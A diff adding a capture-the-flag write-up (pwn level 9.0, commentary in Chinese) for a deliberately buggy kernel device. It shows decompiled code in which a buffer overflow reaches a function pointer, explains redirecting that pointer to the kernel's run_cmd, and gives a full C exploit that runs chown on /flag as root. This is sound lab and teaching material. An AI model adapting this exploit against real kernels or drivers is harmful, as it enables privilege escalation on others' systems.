@@ -716,3 +716,121 @@ int main(void) {
   return 0;
 }
 ```
+
+# Level 9.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Exploit a buggy kernel device to get the flag!
+
+## Write-up
+
+```c
+ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
+{
+  __int64 n66; // rcx
+  $03BF2B29B6BBB97215B935736F34BBB0 *p_logger; // rdi
+  __int64 v7; // rbp
+  $03BF2B29B6BBB97215B935736F34BBB0 logger; // [rsp+0h] [rbp-120h] BYREF
+  unsigned __int64 v10; // [rsp+108h] [rbp-18h]
+
+  n66 = 66;
+  v10 = __readgsqword(0x28u);
+  p_logger = &logger;
+  while ( n66 )
+  {
+    *(_DWORD *)p_logger->buffer = 0;
+    p_logger = ($03BF2B29B6BBB97215B935736F34BBB0 *)((char *)p_logger + 4);
+    --n66;
+  }
+  printk(&unk_C70);
+  logger.log_function = (int (*)(const char *, ...))&printk;
+  if ( length > 0x108 )
+  {
+    _warn_printk("Buffer overflow detected (%d < %lu)!\n", 264, length);
+    BUG();
+  }
+  v7 = copy_from_user(&logger, buffer, length);
+  logger.log_function((const char *)&logger);
+  return length - v7;
+}
+```
+
+```c
+00000000 struct $03BF2B29B6BBB97215B935736F34BBB0 // sizeof=0x108
+00000000 {                                       // XREF: device_write/r
+00000000     char buffer[256];
+00000100     int (*log_function)(const char *, ...); // XREF: device_write+4A/w
+00000100                                         // device_write:loc_BE1/r
+00000108 };
+```
+
+可以看到，整个程序的逻辑也是非常的简单呢，定义了一个结构体，里面有两个字段，分别是 256 字节的 buffer 和一个函数指针。用户可以写入数据覆盖这个结构体，然后程序会将 `buffer` 当作 rdi，调用结构体中定义的函数指针。
+
+这里选择的是 [run_cmd](https://elixir.bootlin.com/linux/v5.4/source/kernel/reboot.c#L422) 这个 kernel ABI 里面提供的调用：
+
+```c
+static int run_cmd(const char *cmd)
+{
+  char **argv;
+  static char *envp[] = {
+    "HOME=/",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+    NULL
+  };
+  int ret;
+  argv = argv_split(GFP_KERNEL, cmd, NULL);
+  if (argv) {
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    argv_free(argv);
+  } else {
+    ret = -ENOMEM;
+  }
+
+  return ret;
+}
+```
+
+注意 `run_cmd` 中要执行的指令需要使用绝对路径，不然可能会失败。另，指令最好不依赖 tty, stdin / stdout / stderr 这些 I/O，否则会失败。
+
+## Exploit
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define STR(x) #x
+#define XSTR(x) STR(x)
+
+#define DEVICE "/proc/pwncollege"
+
+typedef struct {
+  char buf[256];
+  uint64_t func;
+} PACKED payload_t;
+
+int main(void) {
+  int fd = open(DEVICE, O_WRONLY);
+  assert(fd > 0);
+
+  payload_t payload = {0};
+  char *cmd = "/run/dojo/bin/chown 1000:1000 /flag";
+
+  memcpy(payload.buf, cmd, strlen(cmd));
+  payload.func = 0xffffffff81089b30ULL;
+
+  write(fd, &payload, sizeof(payload_t));
+
+  return 0;
+}
+```
